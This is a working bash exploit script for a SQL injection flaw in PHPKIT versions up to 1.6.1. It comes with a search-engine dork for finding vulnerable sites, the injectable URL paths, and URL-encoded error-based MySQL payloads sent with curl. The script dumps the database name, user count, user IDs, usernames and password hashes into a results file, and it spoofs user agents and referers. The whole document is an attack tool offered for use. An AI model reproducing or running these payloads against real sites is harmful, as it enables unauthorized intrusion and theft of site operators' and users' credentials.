#!/bin/bash
#
# HR's PHPKIT <= 1.6.1 SQLi Exploit Script
#
# vuln in the 'contentid' parameter....
#
# DORK: intext:"PHPKIT Version 1.6.03 by moonrise"
#
# Vulns:
# /include.php?path=download&contentid=280'
# /include.php?path=content/download&contentid=117' 
# /include.php?path=content/content.php&contentid=22'
# /include.php?path=article&contentid=69'
#
# ./phpkit.sh -u <URL>
#
# ./phpkit.sh -u "http://www.site.com/include.php?path=download&contentid=280
#
# NOTE: in some cases UNION injection is possible, but Error based works in more cases and also seems to work due to a vuln in the INSERT statement being used in the pkSecurityModule ;) 
#

# Start the fun....
JUNK=/tmp
STORAGE1=$(mktemp -p "$JUNK" -t fooooobarphpkit.tmp.XXX)
STORAGE2=$(mktemp -p "$JUNK" -t fooooobarphpkit2.tmp.XXX)
uagent1="Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
uagent2="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"
uagent3="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"
uagent4="Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
version="%27%20AND%20%28SELECT%208869%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x5b6f6d675d%2C%28SELECT%20MID%28%28%28CASE%20WHEN%20%28ISNULL%28TIMESTAMPADD%28MINUTE%2C7%2C7%29%29%29%20THEN%20%28SELECT%20version%28%29%29%20ELSE%200%20END%29%29%2C1%2C50%29%29%2C0x5b6f6d675d%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27qLgx%27%3D%27qLgx"
currentDB="%27%20AND%20%28SELECT%208869%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x5b6f6d675d%2C%28SELECT%20MID%28%28%28CASE%20WHEN%20%28ISNULL%28TIMESTAMPADD%28MINUTE%2C7%2C7%29%29%29%20THEN%20%28SELECT%20database%28%29%29%20ELSE%200%20END%29%29%2C1%2C50%29%29%2C0x5b6f6d675d%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27qLgx%27%3D%27qLgx"
countEntry1="%27%20AND%20%28SELECT%208869%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x5b6f6d675d%2C%28SELECT%20MID%28%28%28CASE%20WHEN%20%28ISNULL%28TIMESTAMPADD%28MINUTE%2C7%2C7%29%29%29%20THEN%20%28SELECT%20COUNT%28user_name%29%20FROM%20$dbName.phpkit_user%29%20ELSE%200%20END%29%29%2C1%2C50%29%29%2C0x5b6f6d675d%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27qLgx%27%3D%27qLgx"

#First a simple Bashtrap function to handle interupts (CTRL+C)
trap bashtrap INT

function bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	rm -rf "$STORAGE1" 2> /dev/null
	rm -rf "$STORAGE2" 2> /dev/null
	#exit entire script if called
	exit;
}

function usage_info(){
	echo 
	echo "PHPKIT <= 1.6.1 SQL Injection Exploit Script" | grep --color -E 'PHPKIT||1||6||1 SQL Injection Exploit Script'
	echo 
	echo "Dump All Users: " | grep --color 'Dump All Users'
	echo "USAGE: $0 -u <URL>" | grep --color -E 'USAGE||-u'
	echo "EX: $0 -u \"http://www.site.de/include.php?path=content/content.php&contentid=22\"" | grep --color -E 'EX||-u'
	echo
	echo "DORK: intext:\"PHPKIT Version 1.6.03 by moonrise\"" | grep --color 'DORK'
	echo
	exit;
}

function dataCheck(){
	#Pull results from temp storage form URL request and make available....
	xFactor=$(cat "$STORAGE1" | grep "[omg]" | awk -F"[" '{ print $2 }' | sed 's/omg]//' | sed '/^$/d')
}

function dumpAll(){
	foooo=0
	while [ "$foooo" -le "$count" ];
	do
		N="$foooo"
		callUid1="$target$uid1"
		callUser1="$target$userName1"
		callPass1="$target$userPass1"
		uid1="%27%20AND%20%28SELECT%208869%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x5b6f6d675d%2C%28SELECT%20MID%28%28%28CASE%20WHEN%20%28ISNULL%28TIMESTAMPADD%28MINUTE%2C7%2C7%29%29%29%20THEN%20%28SELECT%20uid%20FROM%20$dbName.phpkit_user%20LIMIT%20$N%2C1%29%20ELSE%200%20END%29%29%2C1%2C50%29%29%2C0x5b6f6d675d%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27qLgx%27%3D%27qLgx"
		userName1="%27%20AND%20%28SELECT%208869%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x5b6f6d675d%2C%28SELECT%20MID%28%28%28CASE%20WHEN%20%28ISNULL%28TIMESTAMPADD%28MINUTE%2C7%2C7%29%29%29%20THEN%20%28SELECT%20user_name%20FROM%20$dbName.phpkit_user%20LIMIT%20$N%2C1%20%29%20ELSE%200%20END%29%29%2C1%2C50%29%29%2C0x5b6f6d675d%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27qLgx%27%3D%27qLgx"
		userPass1="%27%20AND%20%28SELECT%208869%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x5b6f6d675d%2C%28SELECT%20MID%28%28%28CASE%20WHEN%20%28ISNULL%28TIMESTAMPADD%28MINUTE%2C7%2C7%29%29%29%20THEN%20%28SELECT%20user_pw%20FROM%20$dbName.phpkit_user%20LIMIT%20$N%2C1%20%29%20ELSE%200%20END%29%29%2C1%2C50%29%29%2C0x5b6f6d675d%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27qLgx%27%3D%27qLgx"
		#UID
		curl "$callUid1" -s --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=CodingProblems" -A "$uagent1" -o "$STORAGE1" 2> /dev/null
		grep -i "[omg]" "$STORAGE1" > /dev/null 2>&1
		if [ "$?" == 0 ]; then
			dataCheck
			userUID="$xFactor"
			echo "UID: $userUID" | grep --color 'UID'
			echo "UID: $userUID" >> phpkit_.results 2> /dev/null
		else
			echo
			echo "Something's wrong, not getting results! Please check manually! Sorry bro............" | grep --color -E 'Something||s wrong||not getting results||Please check manually||Sorry bro'
			echo
			exit;
		fi
		#user_name
		curl "$callUser1" -s --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=CodingProblems" -A "$uagent2" -o "$STORAGE1" 2> /dev/null
		grep -i "[omg]" "$STORAGE1" > /dev/null 2>&1
		if [ "$?" == 0 ]; then
			dataCheck
			USER="$xFactor"
			echo "USER: $USER" >> phpkit_.results 2> /dev/null
			echo "USER: $USER" | grep --color 'USER'
		else
			echo
			echo "Something's wrong, not getting results! Please check manually! Sorry bro............" | grep --color -E 'Something||s wrong||not getting results||Please check manually||Sorry bro'
			echo
			exit;
		fi
		#user_pw
		curl "$callPass1" -s --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=CodingProblems" -A "$uagent3" -o "$STORAGE1" 2> /dev/null
		grep -i "[omg]" "$STORAGE1" > /dev/null 2>&1
		if [ "$?" == 0 ]; then
			dataCheck
			PASS="$xFactor"
			echo "PASS: $PASS" >> phpkit_.results 2> /dev/null
			echo >> phpkit_.results 2> /dev/null
			echo "PASS: $PASS" | grep --color 'PASS'
			echo
		else
			echo
			echo "Something's wrong, not getting results! Please check manually! Sorry bro............" | grep --color -E 'Something||s wrong||not getting results||Please check manually||Sorry bro'
			echo
			exit;
		fi

		foooo=$((foooo +1))
	done
}

function getCount(){
	callCount="$target$countEntry1"
	curl "$callCount" -s --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=CodingProblems" -A "$uagent4" -o "$STORAGE1" 2> /dev/null
	grep -i "[omg]" "$STORAGE1" > /dev/null 2>&1
	if [ "$?" == 0 ]; then
		dataCheck
		count="$xFactor"
		echo "Number of PHPKIT Users: $count" >> phpkit_.results 2> /dev/null
		echo  >> phpkit_.results 2> /dev/null
		echo "Number of PHPKIT Users: $count" | grep --color 'Number of PHPKIT Users'
		echo
	else
		echo
		echo "Something's wrong, not getting results! Please check manually! Sorry bro............" | grep --color -E 'Something||s wrong||not getting results||Please check manually||Sorry bro'
		echo
		exit;
	fi
}

function getDB(){
	callDB="$target$currentDB"
	curl "$callDB" -s --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=CodingProblems" -A "$uagent3" -o "$STORAGE1" 2> /dev/null
	grep -i "[omg]" "$STORAGE1" > /dev/null 2>&1
	if [ "$?" == 0 ]; then
		dataCheck
		dbName="$xFactor"
		echo "Database Name: $dbName" >> phpkit_.results 2> /dev/null
		echo "Database Name: $dbName" | grep --color 'Database Name'
		echo
	else
		echo
		echo "Something's wrong, not getting results! Please check manually! Sorry bro............" | grep --color -E 'Something||s wrong||not getting results||Please check manually||Sorry bro'
		echo
		exit;
	fi
}

function getVersion(){
	callVer="$target$version"
	curl "$callVer" -s --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "http://www.google.com/q?=CodingProblems" -A "$uagent2" -o "$STORAGE1" 2> /dev/null
	grep -i "[omg]" "$STORAGE1" > /dev/null 2>&1
	if [ "$?" == 0 ]; then
		echo "Alright, it's working!" | grep --color -E 'Alright||it||s working'
		dataCheck
		if [ -e phpkit_.results ]; then
			mv phpkit_.results "phpkit_.results_`date +%Y%m%d%H`.bk" 2> /dev/null
		fi 
		touch phpkit_.results 2> /dev/null
		ver="$xFactor"
		echo "PHPKIT <= 1.6.1 SQL Injection Exploit Script" >> phpkit_.results 2> /dev/null
		echo >> phpkit_.results 2> /dev/null
		echo "Site: $target" >> phpkit_.results 2> /dev/null
		echo "Version: $ver" >> phpkit_.results 2> /dev/null
		echo
		echo "Version: $ver" | grep --color 'Version'
		echo
		echo "Grabbing the DB name now....." | grep --color 'Grabbing the DB name now'
		getDB
	else
		echo
		echo "Site doesn't appear to be injectable. Inspect manually to be sure though!" | grep --color -E 'Site doesn||t appear to be injectable||Inspect manually to be sure though'
		echo
		echo
		exit;
	fi
}

function phpkit_attack(){
	echo
	echo "PHPKIT <= 1.6.1 SQL Injection Exploit Script" | grep --color -E 'PHPKIT||1||6||1 SQL Injection Exploit Script'
	echo "By: Hood3dRob1n" | grep --color -E 'By||H||R'
	echo
	# Confirm Site is up and running:
	curl $target -I -A "$uagent1" -e "http://www.google.com/q?=CodingProblems" -o "$STORAGE1" 2> /dev/null
	cat "$STORAGE1" | sed '2,20d' | cut -d' ' -f2 > "$STORAGE2" 2> /dev/null
	cat "$STORAGE2" | while read pageused
	do
		if [ "$pageused" == '200' ]; then
			echo "Site is up, checking injection vector now............" | grep --color -E 'Site is up||checking injection vector now'
			echo
		else
			echo "Page doesn't appear to exist? Please check URL and re-run....." | grep --color -E 'Page doesn||t appear to exist||Please check URL and re||run'
			usage_info
		fi
	done
	#Confirm injection works, by grabbing MySQL version info...
	getVersion
	# IF up & working, we should now have MySQL version and current db name, now we just need to route appropriately...
	echo
	echo "Attempting to Dump All Users...." | grep --color 'Attempting to Dump All Users'
	echo
	getCount
	dumpAll
}


#-MAIN------------------------------------------------------------------->
clear
if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ]; then
	usage_info
fi
while [ $# -ne 0 ];
do
	case $1 in
		-u) shift; method=1; target="$1"; shift ;;
		-t) shift; method=2; targetName="$1"; shift ;; 
		*) echo "Unknown Parameters provided!" | grep --color 'Unknown Parameters provided'; usage_info;;
	esac;
done
phpkit_attack
echo
echo "TYPICAL LOGIN: http://www.site.de/<pk/phpkit>/admin/admin.php" | grep --color 'TYPICAL LOGIN'
echo
echo "Until next time, Enjoy!" | grep --color -E 'Until next time||Enjoy'
echo
rm -rf "$STORAGE1" 2> /dev/null
rm -rf "$STORAGE2" 2> /dev/null
#EOF
